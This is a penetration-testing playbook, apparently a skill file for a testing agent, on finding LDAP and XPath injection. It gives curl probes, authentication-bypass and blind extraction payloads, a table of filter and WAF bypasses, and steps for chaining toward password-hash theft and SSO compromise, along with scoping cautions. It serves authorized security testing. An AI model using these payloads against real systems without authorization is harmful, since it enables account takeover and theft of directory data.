---
name: ldap-xpath-injection
description: >
  Hunt for LDAP and XPath/XQuery injection where user input is concatenated into a directory
  search filter or an XML query. Covers filter breakout, authentication bypass via always-true
  filters, attribute disclosure, and blind boolean extraction. Use when the app authenticates or
  searches against an LDAP/AD backend (login, user/group lookup, address book, SSO) or queries an
  XML document/store with XPath (login against users.xml, config lookups, SOAP backends).
  Keywords: ldap injection, xpath injection, xquery injection, directory search filter, (&(uid=
  , objectClass=*, always true filter, blind boolean, auth bypass, attribute exfiltration.
  Do NOT use for SQL backends (use sqli) or for XML entity expansion / external entities
  (use xxe) — this is about injecting into the LDAP/XPath query language itself.
metadata:
  type: hunt
  phase: hunting
  cwe: [CWE-90, CWE-643, CWE-91]
  mitre_attack: [T1190, T1087, T1212]
  tools: [curl, burp, ffuf, python-ldap3]
depends_on: [active-recon, web-crawling, fuzzing]
feeds_into: [chain-analysis, auth-bypass, info-disclosure]
chains_with: [auth-bypass, info-disclosure, idor]
---

## Signals

- A login or search feature that an LDAP/AD directory backs: corporate SSO, intranet user/group
  search, GAL/address-book lookup, "find colleague", admin user management over LDAP.
- Error strings or stack traces mentioning `javax.naming`, `LDAPException`,
  `InvalidSearchFilterException`, `com.sun.jndi.ldap`, `ldap_search`, `distinguishedName`,
  `objectClass`, or OpenLDAP/AD error codes.
- XML-backed lookups: `XPathException`, `net.sf.saxon`, `javax.xml.xpath`,
  `MXXPathException`, SOAP services whose queries select nodes by a user-supplied value.
- Input reflected into a filter position — a username that, when it contains `)` or `*`,
  changes the result count or throws a filter-syntax error.
- `*` in a search box returning *all* entries is a strong hint the value lands raw in the filter.

## Prerequisites

- An identified parameter that feeds a directory/XML query (login username/password, search term,
  group name, filter field).
- A baseline response for a valid value and for an invalid value, so you can tell "match",
  "no match", and "syntax error" apart (the three oracle states).
- For blind extraction: a stable boolean oracle (login success vs failure, 1 result vs 0,
  present vs absent element) and patience / a script for char-by-char.

## Methodology

1. **Probe for filter breakout (LDAP).** LDAP filters are prefix/paren syntax like
   `(&(uid=INPUT)(userPassword=INPUT2))`. Inject metacharacters and watch for syntax errors vs
   behavioural change:
   ```bash
   # a lone ')' or '*' should perturb the filter if input is concatenated raw
   curl -s "https://target/search?user=*"            # wildcard → all entries?
   curl -s "https://target/search?user=%29"          # ')' → filter syntax error?
   curl -s "https://target/search?user=admin%2A"     # 'admin*' prefix match
   ```
   An unbalanced-paren error or a wildcard dumping everything confirms injectability.

2. **Authentication bypass (LDAP).** Close the username clause and append an always-true filter
   so the bind/search matches the first (often admin) entry:
   ```
   username:  *)(uid=*))(|(uid=*          password: anything
   username:  admin)(&))                  password: anything
   username:  *)(|(objectClass=*)         password: anything
   ```
   Goal: turn `(&(uid=INPUT)(userPassword=INPUT))` into a filter that is true regardless of the
   password clause (comment-out via extra parens / OR a tautology). Confirm you land
   authenticated as a real principal, and *which* one.

3. **Attribute disclosure.** Where results are rendered, inject to broaden the returned set or
   request sensitive attributes. `*` wildcards on each position enumerate entries; combining
   `(|(attr=a*)(attr=b*)...)` enumerates attribute *values* char by char (blind).

4. **Blind boolean extraction (LDAP).** No output? Use the success/no-match oracle to extract an
   attribute value one character at a time with prefix wildcards:
   ```
   *)(uid=admin)(mail=a*       → match? first char of mail is 'a'
   *)(uid=admin)(mail=b*       → ...
   *)(uid=admin)(mail=ad*      → extend the known prefix
   ```
   Script the sweep over the charset; each "match" extends the recovered string.

5. **XPath injection.** XPath login looks like `//user[name/text()='INPUT' and
   pass/text()='INPUT']`. Break out and tautologize:
   ```
   name:  ' or '1'='1          (string context)
   name:  ' or 1=1 or 'a'='a
   name:  '] | //user[name='admin   (node-set union to select admin)
   ```
   For blind XPath, use `substring()`/`string-length()` boolean oracles:
   ```
   ' and string-length(//user[1]/password)>8 and '1'='1
   ' and substring(//user[1]/password,1,1)='a' and '1'='1
   ```

6. **Confirm scope and impact.** Record exactly which filter you broke, the principal/entries you
   reached, and whether you achieved auth bypass, read of other users' attributes, or full
   boolean extraction. Stop before mass-dumping the directory without an operator gate.

## Tooling

- `curl` / Burp Repeater for crafting filter payloads and reading the three oracle states.
- Burp Intruder / `ffuf` for scripting blind char-by-char extraction over a charset.
- `python-ldap3` only to reproduce/verify the *backend* filter locally if you have a test LDAP —
  never to query the target directly outside the web layer.
- A small Python script for the boolean-oracle extraction loop (position × charset).

## Root Causes

- User input concatenated directly into an LDAP search filter or XPath expression with no
  escaping of filter metacharacters (`( ) * \ NUL` for LDAP; `' " [ ] / ` and function syntax
  for XPath).
- No parameterization: LDAP filters built by string formatting instead of using an assertion API
  that escapes values (RFC 4515), XPath built by concatenation instead of variable binding.
- Over-broad base DN / scope letting a tautology match administrative entries.
- Verbose error propagation exposing filter-syntax errors that guide the attacker.
- Auth logic that treats "search returned ≥1 entry" as "credentials valid" without a real bind.

## Validation Gate (minimum proof)

- **Demonstrated:** a crafted filter/XPath payload produces a concrete security effect you show
  end to end — authenticated as a principal you did not have credentials for, retrieved another
  user's attribute value, or extracted ≥1 secret character via the boolean oracle with the
  request/response pair proving the match. Include the payload and the resulting state change.
- **Inferred:** metacharacter injection perturbs the query provably (wildcard dumps all entries,
  unbalanced paren throws a filter-syntax error) but a full bypass/extraction is not yet driven —
  injection is proven, impact pending.
- **Unproven:** "error mentions LDAP so it's probably injectable" with no payload altering
  results. Do not report.
- Name the backend (LDAP/AD vs XPath/XQuery) and the exact filter position broken — this
  determines remediation (RFC 4515 escaping vs XPath variable binding).

## Payloads & Detection Patterns

| Categoría | Shape | Propósito |
|---|---|---|
| LDAP breakout probe | `*` , `)` , `(` , `\` | trigger wildcard-all or filter syntax error |
| LDAP auth bypass | `*)(uid=*))(|(uid=*` | tautologize the AND filter, match first entry |
| LDAP attr blind | `*)(uid=admin)(mail=a*` | char-by-char via prefix wildcard oracle |
| LDAP enumerate | `(|(objectClass=*))` fragment | broaden result set to all objects |
| XPath tautology | `' or '1'='1` | always-true in string context |
| XPath node union | `'] \| //user[name='admin` | select a different node-set |
| XPath blind | `' and substring(//user[1]/pass,1,1)='a` | boolean char extraction |

```bash
# Detection: three-state oracle sweep. Capture responses for valid, invalid, and metachar input.
for v in "validuser" "nouser_zzz" "*" "%29" "admin%2A"; do
  code=$(curl -s -o /tmp/ld.out -w "%{http_code}" "https://target/search?user=$v")
  n=$(grep -c "result-row" /tmp/ld.out 2>/dev/null || echo 0)
  err=$(grep -ioE "ldap|xpath|naming|InvalidSearchFilter|syntax" /tmp/ld.out | head -1)
  echo "user=$v -> http=$code rows=$n err=${err:-none}"
done
# '*' returning far more rows than 'validuser', or '%29' throwing a filter-syntax error,
# distinguishes injection (value reaches the filter) from a sanitized endpoint.
```

## Bypass Techniques

| Filtro evadido | Técnica | Notas |
|---|---|---|
| naive `)` strip | use `*` wildcard only (no parens) | wildcard alone still broadens/leaks |
| blocks `*` | NUL byte `\00` or `\2a` hex-escape in filter | some stacks decode escapes into the raw char |
| XPath quote filter | switch quote style `"` vs `'` or use `concat()` | breaks out of the other string delimiter |
| blocks `=` (XPath) | use `contains()`/`starts-with()` functions | functional comparison avoids literal `=` |
| length-limited field | minimal tautology `*))%00` / `' or 1=1-- -` style | short breakout then truncation |
| WAF keyword `objectClass` | mixed case / alternate always-true `(cn=*)` | filter attrs are case-insensitive |

## Chain Anchors

Before declaring this finding complete, probe these escalation paths:

1. **Authentication bypass** — Does the tautology land you authenticated as admin/another user?
   Chain auth-bypass for the full account takeover.
2. **Directory/PII exfiltration** — Can the wildcard/blind oracle dump usernames, emails, group
   membership, or password hashes (userPassword)? Chain info-disclosure; gate before mass dump.
3. **Privilege/group mapping** — Read `memberOf`/`isMemberOf` to find admin groups, then target
   those accounts (chain idor / authz-matrix).
4. **Password attribute read** — Some directories store recoverable or hashed `userPassword`;
   extracting it feeds credential-testing / offline cracking.
5. **SSO/downstream trust** — If this LDAP backs SSO, a bypass here may grant tokens to every
   federated app — expand scope only with operator authorization.

A finding without chain anchor results is INCOMPLETE. Record each anchor as
tested/not-applicable/blocked with the reason.

## Chains & Compositions

- LDAP injection auth bypass → **auth-bypass** → admin session → **broken-access-control**.
- LDAP wildcard/blind extraction → **info-disclosure** (directory dump: users, emails, groups).
- Recovered `userPassword`/hashes → **credential-testing** (offline cracking, reuse elsewhere).
- `memberOf` disclosure → **authz-matrix** / **idor** (target privileged accounts/objects).
- XPath node-union to select admin node → **auth-bypass** on an XML-backed login.

## Gotchas

- **Minimum proof, not directory dump.** Proving auth bypass or reading one other user's
  attribute is the finding. Enumerating the whole directory is a new scope boundary (bulk PII) —
  stop and get an operator gate first.
- **Three-state oracle, not two.** LDAP/XPath give match / no-match / syntax-error. Confusing a
  syntax-error 500 for a successful bypass is a classic overclaim — the bypass must land you in a
  *valid matched* state, not just a crash.
- **`*` is not always injection.** A search box legitimately supporting `*` wildcards isn't a
  vuln; inject structural metacharacters (`)(|`) and show you altered the filter *structure*, not
  just used an intended wildcard.
- **Common N/A:** input is escaped per RFC 4515 (parens/star/backslash/NUL become `\28 \29 \2a
  \5c \00`) or XPath uses variable binding — payloads land as literal text, zero result change.
  Record as tested-and-safe.
- **Blind extraction is slow and noisy.** Char-by-char over a directory generates many requests;
  respect budget/rate limits and don't trip lockouts on the very accounts you're enumerating.
- **AD vs OpenLDAP differ.** AD is case-insensitive on attribute names and has its own matching
  rules; a payload that works on OpenLDAP may need adjustment. Fingerprint the backend from
  error text before assuming filter semantics.
